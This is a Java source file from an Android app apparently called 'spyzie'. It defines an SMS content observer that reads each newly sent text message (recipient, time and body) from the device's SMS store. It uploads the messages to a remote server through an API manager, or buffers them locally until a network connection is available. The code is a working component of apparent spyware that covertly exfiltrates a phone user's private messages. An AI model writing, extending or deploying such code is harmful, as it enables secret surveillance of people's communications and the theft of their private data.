package com.tantd.spyzie.receiver;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

import com.tantd.spyzie.data.db.AppDbManager;
import com.tantd.spyzie.data.db.DbManager;
import com.tantd.spyzie.data.model.Sms;
import com.tantd.spyzie.data.network.ApiManager;
import com.tantd.spyzie.data.network.AppApiManager;
import com.tantd.spyzie.util.Constants;
import com.tantd.spyzie.util.NetworkUtils;

import java.util.List;

public class SmsObserver extends ContentObserver {

    private long lastSmsId;
    private Context mContext;

    private DbManager mDbManager;
    private ApiManager mApiManager;

    public SmsObserver(Handler handler, Context context) {
        super(handler);
        mContext = context;
        mDbManager = AppDbManager.getInstance();
        mApiManager = AppApiManager.getInstance();
    }

    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        Uri smsUri = Uri.parse("content://sms/sent");
        Cursor cursor = mContext.getContentResolver().query(smsUri, null, null, null, null);
        if (cursor.moveToNext()) {
            long id = cursor.getLong(cursor.getColumnIndex("_id"));
            if (id != lastSmsId) {
                String address = cursor.getString(cursor.getColumnIndex("address"));
                long time = cursor.getLong(cursor.getColumnIndex("date"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                lastSmsId = id;

                Sms outgoingSms = new Sms(id, address, time, body, false);
                if (NetworkUtils.isNetworkConnected(mContext)) {
                    List<Sms> savedData = (List<Sms>) mDbManager.find(Sms.class, 0, Constants.MAX_READ_DATA_ENTRIES);
                    savedData.add(outgoingSms);
                    mApiManager.sendSmsData(savedData);
                    savedData.remove(savedData.size() - 1);
                    if (savedData.size() > 0) {
                        mDbManager.removeSms(savedData);
                    }
                } else {
                    mDbManager.put(outgoingSms);
                }
            }
        }
    }
}
